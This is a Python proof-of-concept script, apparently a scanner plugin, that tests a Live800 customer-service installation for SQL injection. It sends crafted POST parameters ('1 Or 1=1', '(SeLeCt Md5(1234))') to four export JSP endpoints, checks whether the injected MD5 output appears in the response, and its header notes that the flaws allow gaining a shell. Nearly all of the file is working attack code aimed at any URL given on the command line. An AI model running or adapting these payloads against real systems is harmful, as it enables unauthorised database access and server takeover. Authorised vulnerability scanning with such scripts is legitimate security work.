#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800在线客服系统多处SQL注入/GETSHELL漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0177871
author: Lucifer
description: http://domain/sta/export/referrerSta.jsp，
             http://domain/sta/export/chatTopicSta.jsp，
             http://domain/sta/export/chatHoursSta.jsp，
             http://domain/sta/export/chatUrlSta.jsp。四处存在SQL注入漏洞，可GETSHELL。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['live800在线客服系统多处SQL注入/GETSHELL漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Referer":url + "/live800/sta/referrerTypeSta.jsp",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate"
        }
        turl = "/live800/sta/export/referrerSta.jsp"
        vulnurl = url + turl
        payload = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_referrer",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        try:
            req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] =  payload
                return result
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
            return result

        headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate"
        }

        turl = "/live800/sta/export/chatTopicSta.jsp"
        vulnurl = url + turl
        payload = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_topic",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        try:
            req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] =  payload
                return result

            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
            return result

        turl = "/live800/sta/export/chatHoursSta.jsp"
        vulnurl = url + turl
        payload = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_close_reason",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        try:
            req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] =  payload
                return result

            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
            return result

        turl = "/live800/sta/export/chatUrlSta.jsp"
        vulnurl = url + turl
        payload = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_url",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        try:
            req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] =payload
                return result

            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
            return result
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
